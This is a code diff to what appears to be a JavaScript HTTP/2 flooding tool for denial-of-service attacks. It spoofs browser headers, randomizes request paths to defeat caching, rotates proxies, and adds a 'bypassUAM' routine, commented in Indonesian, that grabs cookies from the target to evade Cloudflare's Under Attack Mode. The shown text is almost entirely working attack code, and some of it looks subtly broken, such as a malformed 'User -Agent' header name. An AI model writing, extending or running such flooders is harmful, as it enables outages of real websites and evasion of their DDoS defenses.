@@ -1090,11 +1090,10 @@ const userAgents = [
 
 const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 const userAgent = new UserAgent();
-
 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
-headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
+headers[":path"] = `${parsedTarget.path}?${randstr(10)}=${randstr(5)}`;
 headers[":scheme"] = "https";
 headers["origin"] = "https://pages.dev/cdn-cgi/trace";
 headers["sec-ch-ua"] = ver;
@@ -1111,6 +1110,43 @@ headers["sec-fetch-site"] = "same-origin";
 headers["TE"] = "trailers";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
+
+// Logika untuk bypass UAM dengan mengambil cookie secara real-time
+async function bypassUAM() {
+    const cookies = await fetchCookiesFromTarget(parsedTarget.host);
+    if (cookies) {
+        headers["cookie"] = cookies; // Menambahkan cookie yang diambil dari target
+    }
+}
+
+// Fungsi untuk mengambil cookie dari target
+async function fetchCookiesFromTarget(host) {
+    try {
+        const response = await fetch(`https://${host}`, {
+            method: 'GET',
+            headers: {
+                "User -Agent": randstr(25),
+                "Accept": accept,
+                "Accept-Language": lang,
+                "Accept-Encoding": encoding,
+                "Upgrade-Insecure-Requests": "1"
+            }
+        });
+        
+        // Mengambil cookie dari respons
+        const cookieHeader = response.headers.get('set-cookie');
+        return cookieHeader ? cookieHeader : null;
+    } catch (error) {
+       // console.error("Error fetching cookies:", error);
+        return null;
+    }
+}
+
+// Memanggil fungsi bypassUAM sebelum melakukan permintaan
+bypassUAM().then(() => {
+    // Lanjutkan dengan permintaan setelah cookie diambil
+    Socker.connect(parsedTarget.host, headers);
+});
 
 function runFlooder() {
   const proxyAddr = randomElement(proxies);
